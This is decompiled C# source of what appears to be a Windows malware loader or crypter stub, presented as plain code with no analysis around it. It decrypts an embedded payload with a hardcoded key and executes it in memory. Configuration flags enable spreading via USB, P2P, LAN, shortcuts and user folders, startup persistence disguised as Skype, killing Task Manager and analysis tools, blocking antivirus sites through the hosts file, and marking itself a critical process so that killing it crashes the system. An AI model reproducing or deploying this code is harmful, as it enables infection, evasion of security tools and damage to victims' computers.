using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using WindowsApplication35.My;

namespace WindowsApplication35;

[StandardModule]
internal sealed class Module1
{
	public static string exen = new FileInfo(Application.get_ExecutablePath()).get_Name();

	public static string sleep = "1000";

	public static string usb_S = "False";

	public static string p2p_s = "True";

	public static string KillNoIp = "False";

	public static string BlockAV = "False";

	public static string si = "True";

	public static string lan = "True";

	public static string bsod = "False";

	public static string SpyTh2eSpy = "False";

	public static string cmd = "False";

	public static string srtat = "True";

	public static string keys = "False";

	public static string firewall = "False";

	public static string fol = "True";

	public static string uac = "False";

	public static string PROCESSH = "True";

	public static string apat3eDNS = "False";

	public static string TCPEy1 = "False";

	public static string Procexp = "True";

	public static string TaskMG = "True";

	public static string ApexSP = "True";

	private static string Algorithm = "RC2 Encryption";

	private static string EncPassword = "VHExSPgGahcquLbdoAt4";


	private static byte[] rdCmkRrTAEqtWRthdnIN;

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main(string[] args)
	{
		//IL_01ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f7: Expected O, but got Unknown
		if (Operators.CompareString(Algorithm, "XOR Encryption", false) == 0)
		{
			rdCmkRrTAEqtWRthdnIN = Convert.FromBase64String(XOR_Decrypt(GBtwRBNpxsyWAAkpaDHt, EncPassword));
		}
		if (Operators.CompareString(Algorithm, "RC2 Encryption", false) == 0)
		{
			rdCmkRrTAEqtWRthdnIN = Convert.FromBase64String(RC2_Decrypt(GBtwRBNpxsyWAAkpaDHt, EncPassword));
		}
		if (Operators.CompareString(Algorithm, "TripleDES Encryption", false) == 0)
		{
			rdCmkRrTAEqtWRthdnIN = Convert.FromBase64String(TripleDES_Decrypt(GBtwRBNpxsyWAAkpaDHt, EncPassword));
		}
		if (Operators.CompareString(Algorithm, "DES Encryption", false) == 0)
		{
			rdCmkRrTAEqtWRthdnIN = Convert.FromBase64String(DES_Decrypt(GBtwRBNpxsyWAAkpaDHt, EncPassword));
		}
		if (Operators.CompareString(Algorithm, "WithOut Encryption", false) == 0)
		{
			rdCmkRrTAEqtWRthdnIN = Convert.FromBase64String(GBtwRBNpxsyWAAkpaDHt);
		}
		if (Operators.CompareString(usb_S, "True", false) == 0)
		{
			USB.ExeName = exen;
			USB.Enable();
		}
		if (Operators.CompareString(p2p_s, "True", false) == 0)
		{
			SpreadP2P spreadP2P = new SpreadP2P();
			spreadP2P.p2p();
		}
		if (Operators.CompareString(si, "True", false) == 0)
		{
			ShortcutSpread.ShortcutInfection();
		}
		if (Operators.CompareString(lan, "True", false) == 0)
		{
			WindowsApplication35.lan.lan_sp();
		}
		if (Operators.CompareString(SpyTh2eSpy, "True", false) == 0)
		{
			SpyTheSpy();
		}
		if (Operators.CompareString(apat3eDNS, "True", false) == 0)
		{
			ApateDNS();
		}
		if (Operators.CompareString(PROCESSH, "True", false) == 0)
		{
			ProcessHacker();
		}
		if (Operators.CompareString(TaskMG, "True", false) == 0)
		{
			TaskManger();
		}
		if (Operators.CompareString(TCPEy1, "True", false) == 0)
		{
			TCPEye();
		}
		if (Operators.CompareString(Procexp, "True", false) == 0)
		{
			ProcesExp();
		}
		if (Operators.CompareString(bsod, "True", false) == 0)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					ED();
				});
				pr(1);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(srtat, "True", false) == 0)
		{
			startip.Startup(Application.get_ExecutablePath(), "Skype.exe");
			startip.AStartup("Skype", Application.get_ExecutablePath());
		}
		if (Operators.CompareString(keys, "True", false) == 0)
		{
			Keyscrambler();
		}
		if (Operators.CompareString(firewall, "True", false) == 0)
		{
			Bypass.FirfeWall();
		}
		if (Operators.CompareString(fol, "True", false) == 0)
		{
			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\Dropbox"))
			{
				Folder_Spread.SpreadCode("C:\\Users\\" + Environment.UserName + "\\Dropbox");
			}
			Folder_Spread.SpreadCode("C:\\Users\\" + Environment.UserName + "\\Desktop\\");
			Folder_Spread.SpreadCode("C:\\Users\\" + Environment.UserName + "\\Documents\\");
		}
		if (Operators.CompareString(uac, "True", false) == 0)
		{
			BYPAS.UAC();
		}
		if (Operators.CompareString(ApexSP, "True", false) == 0)
		{
			Apex.apexspread();
		}
		if (Operators.CompareString(KillNoIp, "True", false) == 0)
		{
			KillMyNoIp();
		}
		if (Operators.CompareString(BlockAV, "True", false) == 0)
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "127.0.0.1  www.virustotal.com\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "127.0.0.1  anubis.iseclab.org\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "127.0.0.1  www.virscan.org\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "127.0.0.1  virusscan.jotti.org\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "127.0.0.1  scanner.virus.org\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "127.0.0.1  scanner.novirusthanks.org\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "127.0.0.1  metascan-online.com\r\n", true);
		}
		Thread.Sleep(Conversions.ToInteger(sleep));
		object[] parameters = new object[0];
		Assembly assembly = AppDomain.CurrentDomain.Load(rdCmkRrTAEqtWRthdnIN);
		if (assembly.EntryPoint!.GetParameters().Length > 0)
		{
			parameters = new object[1] { args };
		}
		assembly.EntryPoint!.Invoke(null, parameters);
		ProjectData.EndApp();
	}

	public static string TripleDES_Decrypt(string input, string pass)
	{
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[24];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 8);
			tripleDESCryptoServiceProvider.Key = array;
			tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string RC2_Decrypt(string input, string pass)
	{
		RC2CryptoServiceProvider rC2CryptoServiceProvider = new RC2CryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array2 = (rC2CryptoServiceProvider.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass)));
			rC2CryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rC2CryptoServiceProvider.CreateDecryptor();
			byte[] array3 = Convert.FromBase64String(input);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array3, 0, array3.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string DES_Decrypt(string input, string pass)
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[8];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 8);
			dESCryptoServiceProvider.Key = array;
			dESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = dESCryptoServiceProvider.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string XOR_Decrypt(string Input, string pass)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = Input.Length - 1;
			int num2 = default(int);
			for (int i = 0; i <= num; i += 2)
			{
				string value = Conversions.ToString(Strings.Chr((int)(Conversions.ToLong("&H" + Input.Substring(i, 2)) ^ Strings.Asc(pass[num2]))));
				stringBuilder.Append(value);
				num2 = ((num2 != pass.Length - 1) ? (num2 + 1) : 0);
			}
			return stringBuilder.ToString();
		}
	}

	public static void KillMyNoIp()
	{
		Process[] processesByName = Process.GetProcessesByName("DUC30");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
		Process[] processesByName2 = Process.GetProcessesByName("DUC20");
		foreach (Process process2 in processesByName2)
		{
			process2.Kill();
		}
	}

	public static void ProcessHacker()
	{
		Process[] processesByName = Process.GetProcessesByName("ProcessHacker");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
			process.Close();
		}
	}

	public static void ApateDNS()
	{
		Process[] processesByName = Process.GetProcessesByName("apateDNS");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
			process.Close();
		}
	}

	public static void SpyTheSpy()
	{
		Process[] processesByName = Process.GetProcessesByName("SpyTheSpy");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
			process.Close();
		}
	}

	public static void Keyscrambler()
	{
		Process[] processesByName = Process.GetProcessesByName("KeyScrambler");
		foreach (Process process in processesByName)
		{
			process.Kill();
			process.Close();
		}
	}

	public static void TaskManger()
	{
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	public static void TCPEye()
	{
		Process[] processesByName = Process.GetProcessesByName("Tcpview");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	public static void ProcesExp()
	{
		Process[] processesByName = Process.GetProcessesByName("procexp");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	[DllImport("ntdll")]
	public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void ED()
	{
		pr(0);
	}
}